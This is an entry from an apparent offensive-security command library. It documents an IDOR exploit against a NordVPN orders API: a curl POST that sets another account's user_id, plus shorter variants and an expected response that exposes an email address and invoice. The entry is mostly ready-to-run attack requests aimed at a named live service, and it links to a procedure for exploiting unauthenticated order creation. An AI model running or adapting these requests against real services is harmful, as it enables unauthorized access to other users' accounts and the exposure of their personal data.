---
data: >-
  curl -X POST https://join.nordvpn.com/api/v1/orders -H "Accept:
  application/json" -H "Accept-Language: en-US,en;q=0.5" -H "Content-Type:
  application/json" -d
  '{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":89495247,"tax_country_code":"TW","payment_retry":0,"is_installment":false}'
tags:
  - idor
  - http-post
  - api
  - test-account
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:52.884Z'
id: 8ba50311-7ef9-4c44-8bbf-1a08604bd28f
verified: false
validated: true
submitted: true
---
# nordvpn-idor-post-user89495247

## Command

```bash
curl -X POST https://join.nordvpn.com/api/v1/orders \
  -H "Accept: application/json" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Content-Type: application/json" \
  -d '{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":89495247,"tax_country_code":"TW","payment_retry":0,"is_installment":false}'
```

## Description

This command targets a test user_id 89495247 to validate IDOR exposure of sensitive test data like emails in the NordVPN payment API.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-H headers` | Request headers for JSON | Yes |
| `-d '{...}'` | JSON with test user_id | Yes |
| `user_id:89495247` | Test account ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://join.nordvpn.com/api/v1/orders -d '{"user_id":89495247}'
```

### Advanced Usage

Include custom user-agent:

```bash
curl -X POST https://join.nordvpn.com/api/v1/orders -H "User-Agent: Mozilla/5.0" -d '{"user_id":89495247,"plan_id":653}'
```

## Expected Output

{"id":42616142,"user_id":89495247,"confirmation":{"id":23093800,"type":"redirect_post","value":"{\"url\":\"https:\/\/www.coinpayments.net\/index.php\",\"parameters\":{\"email\":\"hackerhacker@test.pl\",\"amountf\":125.64,\"invoice\":\"49478089\"}}"}}

## Related

- [[commands/nordvpn-idor-post-user23093782]]
- [[procedures/Exploit-IDOR-via-Unauthenticated-POST-to-Orders-API]]
